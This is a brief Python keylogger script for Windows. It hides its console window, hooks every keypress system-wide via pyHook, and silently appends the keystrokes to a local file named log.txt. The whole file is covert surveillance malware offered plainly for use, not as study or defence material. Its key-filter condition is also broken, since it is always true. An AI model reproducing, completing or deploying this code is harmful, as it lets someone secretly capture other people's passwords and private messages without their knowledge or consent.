# Python code for keylogger
# to be used in windows
import pyHook
import pythoncom

import win32api
import win32console
import win32gui

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)


def OnKeyboardEvent(event):
    
    if str(event.Key) == 'Escape':
        exit(1)
    if event.Ascii != 0 or 8:
        #open output.txt to read current keystrokes'
        log = 'log.txt'
        f = open(str(log), 'r+')
        buffer = f.read()
        f.close()
    # open output.txt to write current + new keystrokes
        f = open(str(log), 'w')
        print(event.Key)
        keylogs = str(event.Key)
        if len(keylogs) > 1:
            keylogs = ' ' + keylogs + ' '
        if event.Key == 'Return':
            keylogs = '\n'
        if event.Key == 'Oem_Period':
            keylogs = '.'
        if event.Key == 'Oem_Comma':
            keylogs = ','
        buffer += keylogs
        f.write(buffer)
        f.close()


# create a hook manager object
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
# set the hook
hm.HookKeyboard()
# wait forever
pythoncom.PumpMessages()
